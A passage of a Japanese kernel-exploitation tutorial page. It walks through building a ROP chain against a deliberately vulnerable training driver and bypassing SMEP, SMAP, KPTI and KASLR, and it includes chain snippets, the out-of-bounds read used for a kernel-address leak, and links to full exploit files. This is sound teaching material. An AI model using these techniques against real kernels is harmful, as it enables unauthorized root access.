+<p>ROP chainに直すだけなので、各自でexploitを書いてみてください。exploitの例は<a href="exploit/krop.c">ここ</a>からダウンロードできます。</p>
+<p>ROP chainがなぜか動かないけどデバッグするのが面倒な場合は、ユーザーランドのexploitと同様に適当なアドレスを入れてクラッシュメッセージを見て、そこまで実行できているかデバッグするのが楽です。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*chain++ = rop_pop_rdi;</span><br><span class="line">*chain++ = 0;</span><br><span class="line">*chain++ = 0xdeadbeefcafebabe;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>この際<strong>必ずカーネルやユーザーランドでマップされていないアドレスを使う</strong>ようにしましょう。ROPが正しく動けばSMEPを回避してroot権限が取れるはずです。</p>
+<p>今回のROP chainはカーネル空間のスタックで動いているので、実はSMAPを有効にしてもexploitはそのまま動きます。試してみてください。</p>
+<div class="column" title="コラム：raxをrdiに移せない">
+  通常「<code>mov rdi, rax; rep movsq; ret;</code>」のようなgadgetが存在し、<code>prepare_kernel_cred(NULL)</code>の結果を<code>commit_creds</code>に渡せます。あるいは「<code>mov rdi, rax; call rcx;</code>」のようなgadgetで<code>commit_creds</code>の先頭の<code>push rbp</code>をスキップして実行しても良いでしょう。<br>
+  どうしてもgadgetが見つからない時や、ROP chainを短くしたいときは<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L41"><code>init_cred</code></a>が使えます。<code>init_cred</code>というグローバル変数にはroot権限のcred構造体が入っています。つまり、単に<code>commit_creds(init_cred)</code>を実行するだけでも権限昇格できます。
+</div>
+<h2><span id="kptiの扱い">KPTIの扱い</span></h2>
+<p>次にSMAP, SMEP, KPTIを有効にした状態でexploitしてみましょう。<br>
+KPTI自体はこのような一般的な脆弱性に対する緩和策ではなく、Meltdownという特定のサイドチャネル攻撃に対応するための緩和策です。そのため、これまで使ってきたexploit手法に影響はありませんが、KPTIを有効にした状態でexploitを実行すると次のようにユーザー空間でクラッシュしてしまいます。</p>
+<center>
+  <img src="img/kpti_crash.png" alt="KPTI有効化時の失敗例" style="width:640px;">
+</center>
+<p>ユーザー空間で死んでいるので、<code>swapgs</code>からの<code>iretq</code>でユーザー空間には戻れているのですが、KPTIの影響でページディレクトリがカーネル空間のままなので、ユーザー空間のページが読めない状態になっています。<br>
+<a href="../introduction/security.html">セキュリティ機構</a>の節でも書いたように、ユーザーランドに戻る前にCR3レジスタに0x1000をORしておく必要があります。「そんなgadgetあるのか？」と思うかもしれませんが、この処理はカーネルからユーザー空間に戻る正規の処理に必ず存在しているはずなので、100%見つかります。<br>
+具体的には、<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/entry/entry_64.S#L570"><code>swapgs_restore_regs_and_return_to_usermode</code></a>マクロで実装されています。重要なのは以下の部分です。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">movq	%rsp, %rdi</span><br><span class="line">movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">   /* Copy the IRET frame to the trampoline stack. */</span><br><span class="line">pushq	6*8(%rdi)	/* SS */</span><br><span class="line">pushq	5*8(%rdi)	/* RSP */</span><br><span class="line">pushq	4*8(%rdi)	/* EFLAGS */</span><br><span class="line">pushq	3*8(%rdi)	/* CS */</span><br><span class="line">pushq	2*8(%rdi)	/* RIP */</span><br><span class="line"></span><br><span class="line">/* Push user RDI on the trampoline stack. */</span><br><span class="line">pushq	(%rdi)</span><br><span class="line"></span><br><span class="line">   /*</span><br><span class="line"> * We are on the trampoline stack.  All regs except RDI are live.</span><br><span class="line"> * We can do future final exit work right here.</span><br><span class="line"> */</span><br><span class="line">STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">/* Restore RDI. */</span><br><span class="line">popq	%rdi</span><br><span class="line">SWAPGS</span><br><span class="line">INTERRUPT_RETURN</span><br></pre></td></tr></table></figure>
+<p>最初にpushしているのは後述しますが、<code>iretq</code>に向けてスタックを整備しているものです。その後<code>SWITCH_TO_USER_CR3_STACK</code>を使ってCR3を更新しています。このマクロのアドレスを調べましょう。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>
+<p>なお、シンボルが消えている場合はobjdumpなどでCR3に対する操作（rdiを使って操作している箇所）を探せば良いです。<br>
+さて、ROP chainの中でこの<code>swapgs_restore_regs_and_return_to_usermode</code>のどこにジャンプするかですが、目的はCR3の更新なのでひと目見ると次の箇所に飛べばページディレクトリをユーザー空間に戻してくれそうです。</p>
+<center>
+  <img src="img/switch_to_usermode.png" alt="swapgs_restore_regs_and_return_to_usermodeのgadget" style="width:480px;">
+</center>
+<p>しかし、CR3をユーザー空間のものに更新したらカーネル空間のスタックにあるデータはもはや参照できないので、最後のpopやiretqでデータを読み込むことはできません。<br>
+実は（当たり前と言えば当たり前ですが）このコンテキストスイッチを実現するためにユーザー空間からもカーネル空間からもアクセスが許可されている場所がいくつかあります。先程の</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq	%rsp, %rdi</span><br><span class="line">movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">UNWIND_HINT_EMPTY</span><br></pre></td></tr></table></figure>
+<p>の部分は事前にスタックをその場所に調整していたものです。<br>
+そして、続くpushは本来<code>iretq</code>に渡るはずだったカーネルのスタックにあったデータを、CR3更新後にもアクセス可能な領域にコピーしているコードです。したがって、ROP中では次の0xffffffff81800e26の箇所にジャンプする必要があります。</p>
+<center>
+  <img src="img/kpti_trampoline.png" alt="swapgs_restore_regs_and_return_to_usermodeのtrampoline" style="width:480px;">
+</center>
+<p>今回の場合はswapgsの前に<code>pop rax</code>と<code>pop rdi</code>があります。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81800e89:  pop    rax</span><br><span class="line">0xffffffff81800e8a:  pop    rdi</span><br><span class="line">0xffffffff81800e8b:  swapgs</span><br></pre></td></tr></table></figure>
+<p>先ほどの図で<code>push [rdi]; push rax</code>していた値がここでrax, rdiに戻されます。そして、<code>swapgs</code>時点でのスタックは冒頭の</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81800e32:  push   QWORD PTR [rdi+0x30]</span><br><span class="line">0xffffffff81800e35:  push   QWORD PTR [rdi+0x28]</span><br><span class="line">0xffffffff81800e38:  push   QWORD PTR [rdi+0x20]</span><br><span class="line">0xffffffff81800e3b:  push   QWORD PTR [rdi+0x18]</span><br><span class="line">0xffffffff81800e3e:  push   QWORD PTR [rdi+0x10]</span><br></pre></td></tr></table></figure>
+<p>で構築されたもの（rdiは元のrsp）ですので、gadget呼び出しの0x10バイト先にswapgsで使うデータを置く必要があります。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*chain++ = rop_bypass_kpti;</span><br><span class="line">*chain++ = <span class="number">0xdeadbeef</span>;</span><br><span class="line">*chain++ = <span class="number">0xdeadbeef</span>;</span><br><span class="line">*chain++ = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;win; <span class="comment">// [rdi+0x10]</span></span><br><span class="line">*chain++ = user_cs;</span><br><span class="line">*chain++ = user_rflags;</span><br><span class="line">*chain++ = user_rsp;</span><br><span class="line">*chain++ = user_ss;</span><br></pre></td></tr></table></figure>
+<p>この点に気をつけて、KPTIのもとでも動くkROPを自分の手で完成させてみてください。</p>
+<h2><span id="kaslrの回避">KASLRの回避</span></h2>
+<p>ここまでKASLRを無効化してきましたが、KASLR有効だとexploit可能でしょうか。</p>
+<h3><span id="kaslrのエントロピー">KASLRのエントロピー</span></h3>
+<p>本題に入る前に、そもそもKASLRはどのように実装されているのでしょうか。<br>
+カーネルのアドレスランダム化はページテーブルレベルで行われ、<code>kaslr.c</code>の<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/mm/kaslr.c#L64"><code>kernel_randomize_memory</code></a>関数で実装されています。<br>
+カーネルは0xffffffff80000000から0xffffffffc0000000までの1GBのアドレス空間を確保しています。したがって、KASLRが有効でも0x810から0xc00までの、たかだか0x3f0通り程度のベースアドレスしか生成されません。<!-- TODO:要出展 --></p>
+<center>
+  <img src="img/kaslr_entropy.png" alt="KASLRの範囲" style="width:300px;">
+</center>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="オオカミくん"></div>
+  <p class="says">
+    カーネル空間のASLRはユーザー空間よりも弱いんだね。<br>
+    意外かもしれないけど、カーネルでは一度攻撃が失敗するとカーネルパニックになって総当りが現実的じゃないから、エントロピーが小さくても十分だよ。
+  </p>
+</div>
+<h3><span id="アドレスリーク">アドレスリーク</span></h3>
+<p>ASLRを回避するのと同様に、Kernel ExploitでもKASLRを回避するためにはカーネル空間のアドレスリークが必要です。カーネルは全プログラムで共通なので、例えこのドライバに脆弱性がなくても、別のドライバやカーネル自体にアドレスリークの脆弱性がある場合、それを使えます。<br>
+今回は<code>module_read</code>に範囲外読み込みの脆弱性があるため、これを利用しましょう。今までは<code>module_write</code>のStack Overflowを悪用しましたが、<code>module_read</code>にも同様のスタック上での脆弱性が存在します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">module_read</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> kbuf[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">  printk(KERN_INFO <span class="string">&quot;module_read called\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(kbuf, g_buf, BUFFER_SIZE);</span><br><span class="line">  <span class="keyword">if</span> (_copy_to_user(buf, kbuf, count)) &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;copy_to_user failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>スタック上の変数<code>kbuf</code>にデータを入れていますが、<code>copy_to_user</code>でコピーできるサイズは自由です。したがって、0x400バイトより多くのデータをスタックから読むことが可能です。スタック上にはリターンアドレスの他にも様々なデータがあるため、カーネルの関数やデータの一部を指したポインタが必ず存在します。これをリークすることで、カーネルがロードされたベースアドレスが計算でき、さらに<code>commit_creds</code>等の関数のアドレスも分かります。</p>
+<p>まずはスタック上にKASLRのベースアドレスを特定できるアドレスが存在するかをgdbで確認します。基本的に、デバッグ中はKASLRを無効にしておきましょう。</p>
+<center>
+  <img src="img/kaslr_overread.png" alt="copy_to_user呼び出し時のスタック" style="width:560px;">
+</center>
+<p>0xffffffff81000000付近を指しているアドレスを探すと、上の図で0xffffc9000041beb0と0xffffc9000041bef0にそれぞれ0xffffffff8113d33cと0xffffffff8113d6e3が存在します。このアドレスが何かをkallsymsから調べましょう。ちょうどこのアドレスに合うシンボルは見つからないので、リターンアドレスなど関数の途中を指すポインタであると推測できます。下位数ビットを除外してgrepしてみると、次のようにいくつかヒットします。</p>
+<center>
+  <img src="img/kaslr_lookup.png" alt="アドレスからシンボルの調査" style="width:480px;">
+</center>
+<p><code>vfs_read</code>や<code>ksys_read</code>関数の途中を指しているようです。いずれにせよFGKASLRは無効ですので、カーネルのベースアドレスからこのポインタまでのオフセットは固定です。今回は最初の<code>vfs_read</code>を指しているポインタを利用します。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Leak kernel base */</span></span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x480</span>);</span><br><span class="line">read(fd, buf, <span class="number">0x410</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr_vfs_read = *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)&amp;buf[<span class="number">0x408</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kbase = addr_vfs_read - (<span class="number">0xffffffff8113d33c</span><span class="number">-0xffffffff81000000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kbase = 0x%016lx\n&quot;</span>, kbase);</span><br></pre></td></tr></table></figure>
+<p>これでSMAP,SMEP,KPTI,KASLRすべて有効でも動作するexploitが書けます。ROP gadgetや各種関数に、リークしたカーネルのベースアドレスを使うように修正してみてください。次のようにKASLR有効でも権限昇格できれば成功です。</p>
+<center>
+  <img src="img/kaslr_bypass.png" alt="KASLR有効下での権限昇格" style="width:320px;">
+</center>
+<p>Exploitの例は<a href="exploit/kaslr.c">ここ</a>からダウンロードできます。</p>
+<hr>
+<div class="column" title="例題１">
+  練習問題LK01のスタックオーバーフロー脆弱性のみを利用して、次の各セキュリティ機構の組み合わせでROPをせずret2userのみで権限昇格は可能でしょうか。可能な場合はexploitを書き、不可能な場合は理由を説明してください。<br>
+  (1) SMAP無効 / SMEP無効 / KPTI有効<br>
+  (2) SMAP有効 / SMEP無効 / KPTI無効<br>
+</div>
+<div class="column" title="例題２">
+  <a href="../introduction/security#smep-supervisor-mode-execution-prevention">セキュリティ機構</a>の節で見たように、SMEPはCR4レジスタの21ビット目で制御されます。kROPでCR4レジスタの21ビット目を0にすることでSMEPを無効化し、ret2userで権限昇格できるでしょうか？
+  可能な場合はexploitを書き、不可能な場合は理由を説明してください。
+</div>
+<div class="column" title="例題３">
+  SMAP,SMEP,KPTIが無効でKASLRが有効なとき、Stack Overflow脆弱性のみで（すなわちreadは使わず）権限昇格してください。<br>
+  ヒント：ret2usrでシェルコードを実行する瞬間のレジスタの値を確認する。
+</div>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="welcome-to-holstein.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="heap_overflow.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2022 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
